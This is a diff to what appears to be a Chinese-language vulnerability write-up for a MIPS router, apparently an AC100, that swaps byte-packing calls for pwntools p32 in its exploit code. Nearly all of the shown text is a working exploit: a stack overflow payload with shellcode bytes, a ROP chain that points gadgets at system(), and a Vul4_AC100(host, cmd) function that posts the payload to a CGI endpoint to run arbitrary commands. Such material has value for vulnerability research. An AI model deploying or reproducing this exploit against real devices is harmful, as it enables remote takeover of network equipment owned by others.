@@ -74,7 +74,7 @@ De Bruijn 字符串的首地址为 0x2B2A655C
 
 ```python
 data0  = b'A' * 248
-data0 += (0x2B2A7660).to_bytes(4, 'little')
+data0 += p32(0x2B2A7660)
 data0 += b'A' * 0xff0
 data0 += b"\x57\x04\x04\x24" * 0xff			#写入 addiu $a0, $zero, 0x457
 data0 += b"\x2a\x2b\x04\x3c\x58\x7a\x84\x34\x40\x2b\x19\x3c\xf0\x02\x39\x37\x09\xf8\x20\x03"
@@ -157,27 +157,27 @@ if True:
 	data0 = b''
 
 	data0 += b'A' * 248
-	data0 += gadget_addr.to_bytes(4, 'little')			# 第一次 ra
+	data0 += p32(gadget_addr)							# 第一次 ra
 
 	# gadget 1
 	data0 += b'A' * 24
-	data0 += (0x2B2A64D7).to_bytes(4, 'little') 		# s0 
+	data0 += p32(0x2B2A64D7) 							# s0 
 	data0 += b'\x01' * 4								# s1 
 	data0 += b'\x02' * 4 								# s2 
 	data0 += b'\x03' * 4 								# s3 
 	data0 += b'\x04' * 4 								# s4 
 	data0 += b'\x03' * 4						 		# s5
 	data0 += b'\x06' * 4 								# s6 
-	data0 += (system_addr).to_bytes(4, 'little') 		# s7 
+	data0 += p32(system_addr)					 		# s7 
 	data0 += b'\x08' * 4 								# fa 
-	data0 += (gadget_jalr_addr).to_bytes(4, 'little') 	# 第二次 ra 
+	data0 += p32(gadget_jalr_addr)					 	# 第二次 ra 
 
 	data0 += b'A' * 0xf
 	# 字符串地址
 	data0 += (cmd.encode() + b' #').ljust(85, b'A')
 
 	# gadget 2
-	data0 += (0x2B2A64D7).to_bytes(4, 'little')
+	data0 += p32(0x2B2A64D7)
 
 ```
 
@@ -208,26 +208,26 @@ def Vul4_AC100(host: str, cmd: str) -> None:
 	data0 = b''
 
 	data0 += b'A' * 248
-	data0 += gadget_addr.to_bytes(4, 'little')			# 第一次 ra
+	data0 += p32(gadget_addr)							# 第一次 ra
 
 	# gadget 1
 	data0 += b'A' * 24
-	data0 += (0x2B2A64D7).to_bytes(4, 'little') 		# s0 
+	data0 += p32(0x2B2A64D7)					 		# s0 
 	data0 += b'\x01' * 4								# s1 
 	data0 += b'\x02' * 4 								# s2 
 	data0 += b'\x03' * 4 								# s3 
 	data0 += b'\x04' * 4 								# s4 
 	data0 += b'\x03' * 4						 		# s5
 	data0 += b'\x06' * 4 								# s6 
-	data0 += (system_addr).to_bytes(4, 'little') 		# s7 
+	data0 += p32(system_addr)					 		# s7 
 	data0 += b'\x08' * 4 								# fa 
-	data0 += (gadget_jalr_addr).to_bytes(4, 'little') 	# 第二次 ra 
+	data0 += p32(gadget_jalr_addr) 						# 第二次 ra 
 
 	data0 += b'A' * 0xf
 	data0 += (cmd.encode() + b' #').ljust(85, b'A')
 
 	#gadget 2
-	data0 += (0x2B2A64D7).to_bytes(4, 'little')
+	data0 += p32(0x2B2A64D7)
 	
 	data = b'{"portal_delete_picname":"' + data0 + b'"}'
 	print(requests.post("http://" + host + "/cgi-bin/mbox-config?method=SET&section=wifilith_delete_pic_file", data = data).text)
